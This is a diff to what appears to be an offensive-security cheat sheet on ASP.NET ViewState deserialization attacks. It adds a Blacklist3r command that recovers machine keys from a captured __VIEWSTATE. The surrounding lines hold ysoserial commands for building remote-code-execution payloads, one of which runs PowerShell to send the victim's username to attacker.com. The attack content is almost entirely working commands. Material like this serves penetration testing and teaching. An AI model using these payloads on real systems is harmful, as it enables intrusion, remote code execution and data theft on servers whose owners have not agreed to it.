@@ -186,7 +186,12 @@ Look for serialized Java magic bytes in traffic/cookies to spot candidates: `AC 
 ```
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
 
-# -p ViewState is the plugin that crafts a full __VIEWSTATE payload once a machine key is known;
+# FIRST recover the machineKey the payload needs. Blacklist3r (AspDotNetWrapper.exe) tests a captured
+# __VIEWSTATE (plus its __VIEWSTATEGENERATOR) against known/default/leaked keys and prints any match:
+AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <__VIEWSTATE_value> \
+  --purpose=viewstate --modifier=<__VIEWSTATEGENERATOR_value> --macdecode
+#   -> on a hit it prints the validationkey/validationalg (+ decryptionkey/alg) to use below.
+# -p ViewState is the plugin that crafts a full __VIEWSTATE payload once that machine key is known;
 # it requires the recovered key/algorithm params below, not just "-p ViewState" on its own:
 ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --apppath="/" --path="/default.aspx" \
   --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
